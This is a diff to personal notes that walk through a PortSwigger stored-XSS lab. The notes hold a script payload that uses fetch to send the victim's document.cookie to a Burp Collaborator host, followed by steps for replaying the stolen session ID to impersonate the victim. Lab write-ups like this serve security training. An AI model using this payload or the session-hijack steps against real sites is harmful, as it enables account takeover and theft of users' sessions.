@@ -2,11 +2,16 @@
 
 ## This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.
 
+___
+#stealing_cookies
+
 ### Hint:
 
 ```javascript
 <script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
 ```
+
+step 1
 
 copy url from burpcollector
 `t5z4yu4ozlb99987tz4q3wu3puvljc71.oastify.com`
@@ -18,7 +23,7 @@ copy url from burpcollector
 submit comment
 
 pull from burp collector
-copy session id from http request
+copy session id from HTTP request
 intercept home page
-change session id and in poxy option mark response on
-then forword lab solved
+change session id and in proxy option mark response on
+then forward lab solved
